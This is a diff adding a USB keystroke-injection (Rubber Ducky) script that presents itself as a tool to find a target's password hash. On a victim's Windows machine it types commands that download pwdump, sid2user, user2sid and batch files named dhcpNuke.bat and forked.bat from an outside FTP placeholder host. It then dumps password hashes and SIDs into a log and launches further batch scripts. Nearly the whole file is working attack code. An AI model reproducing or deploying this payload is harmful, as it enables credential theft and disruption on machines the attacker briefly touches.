@@ -1,0 +1,157 @@
+REM This program finds the password hash of a specified target
+REM Remember to change all the directories and credentials to suit your target!
+
+ DELAY 6000
+ ESCAPE
+ CONTROL ESCAPE
+ DELAY 400
+ STRING cmd
+ DELAY 300
+ ENTER
+ DELAY 400
+ STRING notepad.exe
+ ENTER
+ DELAY 200
+
+ STRING passLog > passLog.txt
+ ENTER
+ STRING echo Program developed by >> passLog.txt
+ ENTER
+ STRING echo Cyrus Majd >> passLog.txt
+ ENTER
+ STRING echo In contribution to >> passLog.txt
+ ENTER
+ STRING echo ~ =============================================== ~ >> passLog.txt
+ ENTER
+ STRING echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ` >> passLog.txt
+ ENTER
+ STRING echo ` #     # #     #  #####   #####   #####  ####### ` >> passLog.txt
+ ENTER
+ STRING echo ` #     # #     # #     # #     # #     #    #    ` >> passLog.txt
+ ENTER
+ STRING echo ` #     # #     # #       #       #          #    ` >> passLog.txt
+ ENTER
+ STRING echo ` ####### #######  #####  #        #####     #    ` >> passLog.txt
+ ENTER
+ STRING echo ` #     # #     #       # #             #    #    ` >> passLog.txt
+ ENTER
+ STRING echo ` #     # #     # #     # #     # #     #    #    ` >> passLog.txt
+ ENTER
+ STRING echo ` #     # #     #  #####   #####   #####     #    ` >> passLog.txt
+ ENTER
+ STRING echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ` >> passLog.txt
+ ENTER
+ STRING echo ~ =============================================== ~ >> passLog.txt
+ ENTER
+ CONTROL S
+
+REM Here you install all your necessary attack codes
+ ESCAPE
+ CONTROL ESCAPE
+ DELAY 400
+ STRING cmd
+ DELAY 400
+ ENTER
+ STRING echo open ftp.example.domain > installftp.txt
+ ENTER
+ STRING echo username >> installftp.txt
+ ENTER
+ STRING echo password >> installftp.txt
+ ENTER
+ STRING echo get pwdump.exe >> installftp.txt
+ ENTER
+ DELAY 10000
+ STRING echo get sid2user.exe >> installftp.txt
+ ENTER
+ DELAY 10000
+ STRING echo get user2sid.exe >> installftp.txt
+ ENTER
+ DELAY 10000
+ STRING echo get ftptest.bat >> installftp.txt
+ ENTER
+ DELAY 1000
+ STRING echo get Factorial.bat >> installftp.txt
+ ENTER
+ DELAY 1000
+ STRING echo get dhcpNuke.bat >> installftp.txt
+ ENTER
+ DELAY 1000
+ STRING echo get forked.bat >> installftp.txt
+ ENTER
+ DELAY 1000
+ STRING quit >> installftp.txt
+ ENTER
+ DELAY 100
+ STRING ftp -s:installftp.txt
+ ENTER
+ DELAY 30000
+ STRING exit
+ ENTER
+ DELAY 100
+ ESCAPE
+ CONTROL ESCAPE
+ DELAY 400
+ STRING cmd
+ DELAY 400
+ ENTER
+ DELAY 400
+ STRING cd C:\Users\User\Desktop\sid2user
+ ENTER
+ DELAY 100
+REM Replace "User" in the next line with the actual user you are targeting
+ STRING user2sid User >> passLog.txt
+ ENTER
+ DELAY 1000
+ STRING sid2user User >> passLog.txt
+ ENTER
+ DELAY 1000
+ STRING exit
+ ENTER
+ GUI
+ TAB
+ DELAY 200
+ TAB
+ DELAY 200
+ DOWNARROW
+ DELAY 200
+ ENTER
+ DELAY 100
+ DOWNARROW
+ DELAY 100
+ DOWNARROW
+ DELAY 100
+ DOWNARROW
+ DELAY 100
+ ENTER
+ DELAY 10000
+ ENTER
+ DELAY 20000
+ ESCAPE
+ CONTROL ESCAPE
+ DELAY 400
+ STRING cmd
+ ENTER
+ DELAY 100
+ STRING cd C:\Users\User\Desktop\pwdump
+ ENTER
+ DELAY 100
+ STRING pwdump.exe >> C:\Users\User\Desktop\passLog.txt
+ ENTER
+ STRING exit
+ ENTER
+REM Now the password hashes and SIDs are passed down to our log file. Its time to call everyone else into action!
+ ESCAPE
+ CONTROL ESCAPE
+ DELAY 200
+ STRING cmd
+ DELAY 200
+ ENTER
+ DELAY 400
+ STRING cd C:\Users\User\Desktop 
+ ENTER
+ DELAY 200
+ STRING Factorial.bat
+ ENTER
+ DELAY 100
+ ESCAPE
+ 
